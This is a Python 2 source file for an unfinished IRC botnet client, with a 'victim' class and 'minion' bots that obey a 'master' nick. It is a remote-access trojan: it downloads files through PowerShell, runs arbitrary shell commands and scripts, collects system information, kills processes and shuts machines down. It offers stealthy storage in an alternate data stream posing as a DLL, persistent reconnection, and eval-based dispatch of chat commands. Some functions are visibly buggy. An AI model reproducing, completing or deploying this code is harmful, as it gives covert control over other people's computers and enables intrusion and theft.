'''
TODO: Fix modules and test them out. 
'''


import json
import os
import socket
import sqlite3
import sys
import string
import random
import re
import subprocess
import time


class victim:
    #Change these variables to your liking. Commands list is in the below class.
    irc_host = "127.0.0.1"
    irc_port = 6667 #1337
    irc_channel = "#test"
    master_nick = "Gru"
    master_user = "master-" + master_nick
    #Store files in the alternate data stream (stealthy).
    useADS = False
    persistence = False
    client_socket = socket.socket()
    configFilePath = "pirc_config.txt"
    #CHANGE FOR WINDOWS. UNCOMMENT
    baseFolder = os.getenv("LOCALAPPDATA")
    #baseFolder = "/home/rajonali/"
    def __init__(self):
        #Generate a random string
        self.randGenName = ''.join(random.choice(string.lowercase) for i in range(6))
        self.my_user = "minion-" + self.randGenName
        self.my_nick = self.randGenName

        if self.useADS:
            self.configFilePath = "winAPIx64.dll:pirc_config.txt"
        self.configFilePath = os.path.join(self.baseFolder, self.configFilePath)
        #If there is already a file, retrieve those variables.
        if os.path.isfile(self.configFilePath):
            with open(self.configFilePath) as configFile:
                self.config = json.load(configFile)
                self.my_nick = self.config['my_nick']
                self.my_user = self.config['my_user']
                self.master_nick = self.config['master_nick']
                self.master_user = self.config['master_user']

        #Otherwise create a new config file and store newly generated configs.
        else:
            self.config = {
            "master_nick" : self.master_nick,
            "master_user" : self.master_user,
            "my_nick" : self.my_nick,
            "my_user" : self.my_user
            }

            with open(self.configFilePath, 'w') as configFile:
                json.dump(self.config, configFile)


    #Create socket connection with persistence if specified and login to IRC server with creds.
    def connect_server(self):
        print "connecting to:" + self.irc_host
        if (self.persistence):
            connected = False
            while not connected:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    self.client_socket.connect((self.irc_host, self.irc_port))
                    connected = True
                    print "Connection successful! "
                except:
                    print "Connection failed. Trying again in 10 seconds..."
                    time.sleep(10)
                    continue
        else:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                self.client_socket.connect((self.irc_host, self.irc_port))
                print "Connection successful! "
            except:
                print "Connection failed."



        self.client_socket.send("USER " + self.my_user + " " + self.my_user +" " + self.my_user + " :This is a fun bot!\r\n")
        self.client_socket.send("NICK " + self.my_nick + "\r\n")
        self.client_socket.send("JOIN " + self.irc_channel + "\r\n")

    #IRC helper function
    def send_command(self, command):
        self.client_socket.send(command + "\r\n")
        sendCommand = command + "\r\n"
        self.client_socket.send(sendCommand)
    def give_perms(self):
        pass
    def message(self, message, username):
        self.client_socket.send("PRIVMSG "  +  username + " " + message +"\r\n")
    def message_channel(self, message):
        self.client_socket.send("PRIVMSG " + self.irc_channel + " " + message + "\r\n")
    def quit(self):
        self.client_socket.send_command("QUIT")
        self.client_socket.close()
    def get_text(self):
        text=self.client_socket.recv(2040)
        if 'PING' in text:
            self.irc.send('PONG ' + text.split()[1] + '\r\n')
        return text




class messageparse:
    #ADD argparse
    #ADD send file with sockets

    '''
    Define command prefix and regex and define in a function below.
    RULES:
    - Same function name and commands name.
    - No spaces in function name of course.
    - Same amount of params as regex groups and in same order.
    - If expecting an output, return an output. Look at other function for an examples.
    - When IRC command is issued in a chat client, a ! must be prepended.
    '''

    commands = {
        "download" : r'download (http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+) (.*)',
        "runscript" : r'run (.*?) (.*)',
        "shell" : r'shell (.*)',
        "shutdown" : r'shutdown -s',
        "changeconf" : r'changeconf (.*) (.*)',
        "ipconfig" : r'ipconfig',
        "systeminfo" : r'systeminfo',
        "processes" : r'tasklist',
        "kill" : r'kill (.*)',
        "help" : r'help'
    }


    def __init__(self,message,master_user, master_nick, configFile):
        self.message = message
        self.master_user = master_user
        self.master_nick = master_nick
        self.configFile = configFile
        pattern = r':(.*)!(.*)@(.*) PRIVMSG #(.*?) :?(.*)'
        matches = re.search(pattern, self.message, re.M|re.I)
        if matches:
            self.nickname = matches.group(1)
            self.username = matches.group(2)
            self.serverAddr = matches.group(3)
            self.channel = matches.group(4)
            self.message = matches.group(5)

    #If sender has same master creds as given master creds, return true.
    def isMaster(self, master_user, master_nick):
        if((self.username == master_user) and (self.nickname == master_nick)):
            return True;
        else:
            return False

    #Download a file with powershell and assign a custom name.
    def download(self, url, filename):
        try:
            p = subprocess.Popen('powershell.exe ' + '(New-Object System.Net.WebClient).DownloadFile($%s, $%s)' % url, filename, stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Execute a powershell script.
    #ADD args
    def runscript(self, filename, args=""):
        try:
            p = subprocess.Popen('powershell.exe -File \"& \'%~%s\'\" %s' % filename, args, stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Execute a cmd or powershell command.
    def shell(self, command, powershell=False):
        try:
            if powershell:
                p = subprocess.Popen('powershell.exe %s' % command, stdout=subprocess.PIPE)
            else:
                p = subprocess.Popen('%s' % command, stdout=subprocess.PIPE)

            out, err =  p.communicate()
            return out

        except:
            pass

    #Shutdown computer from cmd.
    def shutdown(self):
        try:
            p = subprocess.Popen(['shutdown', '-s'], stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Change a variable in conf.
    def changeconf(self, key, newvalue):
        try:
            with open(self.configFile, 'r') as f:
                data = json.load(f)
                data[key] = newvalue

            os.remove(self.configFile)
            with open(self.configFile, 'w') as f:
                json.dump(data, f)
        except:
            pass

    #Get ipconfig output.
    def ipconfig(self):
        try:
            p = subprocess.Popen('ipconfig', stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Get system info.
    def systeminfo(self):
        try:
            p = subprocess.Popen('systeminfo', stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass


    #Get running process list.
    def processes(self):
        try:
            p = subprocess.Popen('tasklist /svc', stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Kill a process with PID or name. (e.g. !kill /PID 9876 or !kill /im xyz.exe)
    def kill(self, args):
        try:
            p = subprocess.Popen('taskkill ' + args, stdout=subprocess.PIPE)
            out, err =  p.communicate()
            return out
        except:
            pass

    #Get command list in JSON format.
    def help(self):
        try:
            return json.dumps(self.commands)
        except:
            pass



def main():
    inst1 = victim()
    inst1.connect_server()

    while 1:
        recved = inst1.get_text()
        inst2 = messageparse(recved, inst1.master_user, inst1.master_nick, inst1.configFilePath)
        message = inst2.message

        if (message[0] == "!"):
            message = message[1:]
            for key in inst2.commands:
                pattern = inst2.commands[key]
                matches = re.search(pattern, message, re.M|re.I)
                if matches:
                    funct_name = message.split()[0]
                    paramList = list(matches.groups())
                    paramList = [x.replace("\r","") for x in paramList]
                    finalForm = funct_name + "(" +  ",".join('"' + param + '"' for param in paramList) + ")"
                    print inst2.isMaster(inst1.master_user, inst1.master_nick)
                    if (inst2.isMaster(inst1.master_user, inst1.master_nick)):
                        #print "inst2." + str(finalForm)
                        #print eval("inst2." + str(finalForm))  Stores command output
                        print eval("inst2." + str(finalForm))
                        #print "hermes link ice blue mink"
        else:
            print recved


if __name__ == "__main__":
    main()
